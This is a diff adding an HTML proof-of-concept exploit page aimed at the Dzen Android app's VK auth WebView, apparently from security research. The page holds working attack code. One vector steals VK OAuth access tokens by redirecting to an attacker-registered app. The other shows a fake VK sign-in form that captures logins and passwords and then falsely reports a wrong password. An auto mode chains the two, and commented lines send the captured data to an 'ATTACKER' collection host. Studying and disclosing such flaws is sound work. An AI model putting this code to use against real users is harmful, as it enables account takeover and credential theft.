@@ -1,0 +1,261 @@
+<!doctype html>
+<!--
+  VKWebViewAuthActivity exploit page — loaded via vk_validation_url extra.
+  Triggered by a_vkauth.html's intent:// redirect.
+
+  This page runs in a WebView with:
+    - JavaScript enabled (VKWebViewAuthActivity.java:332)
+    - VK session cookies (shared CookieManager across all app WebViews)
+    - No AndroidBridge (unlike VkBrowserActivity chain)
+
+  Attack vector 1 — OAuth token theft via redirect:
+    Page redirects WebView to VK OAuth authorize endpoint with attacker's
+    app_id and redirect_uri. The WebView has VK cookies → user is
+    auto-authenticated → sees consent screen → clicks Allow →
+    VK redirects to attacker's callback with access_token in fragment.
+
+  Attack vector 2 — Phishing:
+    Shows a fake VK login form in Dzen's trusted app context.
+    User has no reason to suspect it's not genuine VK auth.
+
+  Caller chain:
+    a_vkauth.html → intent:// → VKWebViewAuthActivity.onCreate
+    → getStringExtra("vk_validation_url") (line 335)
+    → setJavaScriptEnabled(true) (line 332)
+    → loadUrl(vk_validation_url) (line 352)
+    → this page executes with VK cookies available
+-->
+<html>
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VK Authorization</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #edeef0; }
+  .mode-select { padding: 16px; background: #fff; margin-bottom: 8px; }
+  .mode-select h3 { font-size: 14px; color: #333; margin-bottom: 8px; }
+  .mode-select button { display: block; width: 100%; padding: 10px; margin: 4px 0;
+    border: 1px solid #dce1e6; border-radius: 8px; background: #fff;
+    font-size: 14px; cursor: pointer; text-align: left; }
+  .mode-select button:active { background: #f0f2f5; }
+  #log-panel { padding: 12px; font-size: 12px; }
+  #log-panel pre { white-space: pre-wrap; word-break: break-word;
+    background: #fff; padding: 12px; border-radius: 8px; max-height: 60vh; overflow: auto; }
+
+  /* Phishing form styles (VK-like) */
+  .vk-auth { display: none; flex-direction: column; align-items: center;
+    min-height: 100vh; background: #fff; padding: 40px 24px 24px; }
+  .vk-logo { width: 56px; height: 56px; background: #0077ff; border-radius: 12px;
+    display: flex; align-items: center; justify-content: center; margin-bottom: 20px; }
+  .vk-logo svg { width: 32px; height: 32px; fill: #fff; }
+  .vk-title { font-size: 20px; font-weight: 600; color: #222; margin-bottom: 6px; }
+  .vk-subtitle { font-size: 14px; color: #818c99; margin-bottom: 24px; text-align: center; }
+  .vk-input { width: 100%; max-width: 320px; padding: 12px 14px; margin-bottom: 12px;
+    border: 1px solid #dce1e6; border-radius: 10px; font-size: 16px; outline: none; }
+  .vk-input:focus { border-color: #0077ff; }
+  .vk-btn { width: 100%; max-width: 320px; padding: 12px; border: none; border-radius: 10px;
+    background: #0077ff; color: #fff; font-size: 16px; font-weight: 500; cursor: pointer; }
+  .vk-btn:active { background: #0066dd; }
+  .vk-forgot { margin-top: 16px; color: #0077ff; font-size: 14px; text-decoration: none; }
+</style>
+</head>
+<body>
+
+<!-- Mode selector (for PoC demonstration) -->
+<div id="mode-panel" class="mode-select">
+  <h3>VKWebViewAuthActivity Exploit PoC</h3>
+  <p style="font-size:12px;color:#666;margin-bottom:8px">
+    Running inside VKWebViewAuthActivity WebView (JS enabled, VK cookies shared).
+  </p>
+  <button onclick="startOAuth()">Vector 1: OAuth Token Theft via Redirect</button>
+  <button onclick="startPhishing()">Vector 2: Phishing (fake VK login)</button>
+  <button onclick="startAuto()">Auto: try OAuth first, fall back to phishing</button>
+</div>
+
+<!-- Log panel -->
+<div id="log-panel">
+  <pre id="out">initializing…</pre>
+</div>
+
+<!-- Phishing form (hidden by default) -->
+<div id="phish-form" class="vk-auth">
+  <div class="vk-logo">
+    <svg viewBox="0 0 24 24"><path d="M12.01 2C6.49 2 2 6.49 2 12.01s4.49 10.01 10.01 10.01S22.02 17.53 22.02 12.01 17.53 2 12.01 2zm4.84 13.6h-1.66c-.63 0-.82-.5-1.95-1.65-.98-.95-1.41-1.08-1.65-1.08-.34 0-.44.1-.44.56v1.51c0 .4-.13.64-1.18.64-1.74 0-3.67-.05-5.63-3.01C2.72 9.82 2.2 7.74 2.2 7.38c0-.24.1-.46.56-.46h1.66c.42 0 .58.19.74.63.81 2.35 2.17 4.41 2.73 4.41.21 0 .3-.1.3-.63V9.48c-.06-1.13-.66-1.22-.66-1.62 0-.19.16-.38.42-.38h2.61c.35 0 .48.19.48.6v2.8c0 .35.16.48.26.48.21 0 .38-.13.77-.52 1.19-1.33 2.04-3.39 2.04-3.39.11-.24.3-.46.72-.46h1.66c.5 0 .61.26.5.6-.21.96-2.25 3.85-2.25 3.85-.18.29-.24.42 0 .74.18.24.74.74 1.13 1.19.72.82 1.26 1.51 1.41 1.99.15.45-.08.69-.53.69z"/></svg>
+  </div>
+  <div class="vk-title">Sign in to VK</div>
+  <div class="vk-subtitle">Enter your phone number or email<br>to continue using Dzen</div>
+  <input id="vk-login" class="vk-input" type="text" placeholder="Phone or email" autocomplete="off">
+  <input id="vk-pass" class="vk-input" type="password" placeholder="Password" autocomplete="off">
+  <button class="vk-btn" onclick="captureCredentials()">Sign in</button>
+  <a class="vk-forgot" href="#" onclick="return false">Forgot password?</a>
+</div>
+
+<!-- OAuth callback detector -->
+<div id="callback-panel" style="display:none;padding:24px;text-align:center">
+  <h2 style="color:#e64646">TOKEN CAPTURED</h2>
+  <pre id="token-data" style="text-align:left;background:#f5f5f5;padding:12px;border-radius:8px;white-space:pre-wrap;word-break:break-word;font-size:12px"></pre>
+</div>
+
+<script>
+(function() {
+  var out = document.getElementById('out');
+  var seq = 0;
+  function log(s) {
+    out.textContent += "\n[" + (seq++) + "] " + s;
+    out.scrollTop = out.scrollHeight;
+  }
+  out.textContent = "origin: " + location.origin;
+  log("href:   " + location.href);
+  log("ua:     " + navigator.userAgent);
+
+  /* Check if we landed on a callback URL with token in fragment */
+  if (location.hash && location.hash.indexOf('access_token') !== -1) {
+    handleTokenCallback();
+    return;
+  }
+
+  /* Detect WebView context */
+  var isWebView = /; wv\)/.test(navigator.userAgent) || typeof Android !== 'undefined';
+  log("WebView detected: " + isWebView);
+
+  /* Check for VK cookies (same cookie jar) */
+  log("document.cookie: " + (document.cookie || "(empty — cross-domain, expected)"));
+
+  /* Check what bridges are available (should be none in VKWebViewAuthActivity) */
+  var bridges = ['AndroidBridge', 'AndroidJsObject', 'vkAdsWebInterface'];
+  bridges.forEach(function(name) {
+    log("window." + name + ": " + (typeof window[name] !== 'undefined' ? 'FOUND' : 'absent'));
+  });
+
+  function exfil(tag, data) {
+    log("\n====== EXFILTRATED [" + tag + "] ======");
+    log(JSON.stringify(data, null, 2));
+    log("======================================");
+    // Uncomment below to send to attacker C2 server:
+    // new Image().src = 'https://ATTACKER/c?t=' + tag
+    //   + '&d=' + encodeURIComponent(JSON.stringify(data));
+  }
+
+  // ---- CONFIG ----
+  // Set your raw.githack.com base URL here (same as in a_vkauth.html).
+  var GITHACK_BASE = 'https://raw.githack.com/user/repo/master/results/pocs/zen_intent_redirect/web/';
+  // ---- END CONFIG ----
+
+  /* ---- Vector 1: OAuth Token Theft ---- */
+  window.startOAuth = function() {
+    log("\n--- Starting OAuth Token Theft ---");
+
+    // Attacker's VK app credentials (replace with real registered app)
+    var attackerAppId = '7058363';  // placeholder — use attacker's registered VK app
+    var attackerRedirect = GITHACK_BASE + 'oauth_steal.html';
+    var scope = 'friends,photos,status,messages,offline';
+
+    var oauthUrl = 'https://oauth.vk.com/authorize'
+      + '?client_id=' + attackerAppId
+      + '&redirect_uri=' + encodeURIComponent(attackerRedirect)
+      + '&scope=' + scope
+      + '&response_type=token'
+      + '&display=mobile'
+      + '&v=5.131'
+      + '&revoke=1';
+
+    log("OAuth URL: " + oauthUrl);
+    log("The WebView has VK cookies → user is auto-authenticated");
+    log("VK will show consent screen for this app_id");
+    log("On 'Allow' → redirect to our callback with access_token");
+    log("\nRedirecting to VK OAuth in 1s …");
+
+    setTimeout(function() {
+      log(">>> redirecting now");
+      location.href = oauthUrl;
+    }, 1000);
+  };
+
+  /* ---- Vector 2: Phishing ---- */
+  window.startPhishing = function() {
+    log("\n--- Starting Phishing Attack ---");
+    log("Hiding PoC panels, showing fake VK login form");
+    log("User sees VK-branded login inside Dzen's WebView (trusted context)");
+
+    document.getElementById('mode-panel').style.display = 'none';
+    document.getElementById('log-panel').style.display = 'none';
+    document.getElementById('phish-form').style.display = 'flex';
+  };
+
+  /* ---- Auto mode ---- */
+  window.startAuto = function() {
+    log("\n--- Auto mode ---");
+    log("Attempting OAuth redirect first…");
+    log("If VK rejects (invalid redirect_uri) → falling back to phishing");
+
+    // Try OAuth
+    startOAuth();
+
+    // If still on this page after 5s, OAuth redirect didn't work → phish
+    setTimeout(function() {
+      if (location.hash.indexOf('access_token') === -1) {
+        log("OAuth redirect may have failed — switching to phishing");
+        startPhishing();
+      }
+    }, 5000);
+  };
+
+  /* ---- Phishing credential capture ---- */
+  window.captureCredentials = function() {
+    var login = document.getElementById('vk-login').value;
+    var pass = document.getElementById('vk-pass').value;
+
+    if (!login || !pass) return;
+
+    exfil('credentials', {
+      login: login,
+      password: pass,
+      source: 'VKWebViewAuthActivity_phishing',
+      timestamp: new Date().toISOString()
+    });
+
+    // Show fake "loading" then "error" to re-prompt
+    var btn = document.querySelector('.vk-btn');
+    btn.textContent = 'Signing in…';
+    btn.disabled = true;
+
+    setTimeout(function() {
+      btn.textContent = 'Sign in';
+      btn.disabled = false;
+      document.querySelector('.vk-subtitle').textContent =
+        'Incorrect password. Please try again.';
+      document.querySelector('.vk-subtitle').style.color = '#e64646';
+      document.getElementById('vk-pass').value = '';
+      document.getElementById('vk-pass').focus();
+    }, 2000);
+  };
+
+  /* ---- OAuth callback handler ---- */
+  function handleTokenCallback() {
+    document.getElementById('mode-panel').style.display = 'none';
+    document.getElementById('log-panel').style.display = 'none';
+    document.getElementById('callback-panel').style.display = 'block';
+
+    var fragment = location.hash.substring(1);
+    var params = {};
+    fragment.split('&').forEach(function(pair) {
+      var kv = pair.split('=');
+      params[decodeURIComponent(kv[0])] = decodeURIComponent(kv[1] || '');
+    });
+
+    var tokenEl = document.getElementById('token-data');
+    tokenEl.textContent = "*** VK ACCESS TOKEN STOLEN ***\n\n"
+      + "access_token: " + (params.access_token || '?') + "\n"
+      + "expires_in:   " + (params.expires_in || '?') + "\n"
+      + "user_id:      " + (params.user_id || '?') + "\n"
+      + "email:        " + (params.email || 'n/a') + "\n\n"
+      + "Full fragment:\n" + fragment + "\n\n"
+      + "All params:\n" + JSON.stringify(params, null, 2);
+
+    // Exfiltrate
+    // new Image().src = 'https://ATTACKER/c?t=oauth_token'
+    //   + '&d=' + encodeURIComponent(JSON.stringify(params));
+  }
+})();
+</script>
+</body>
+</html>
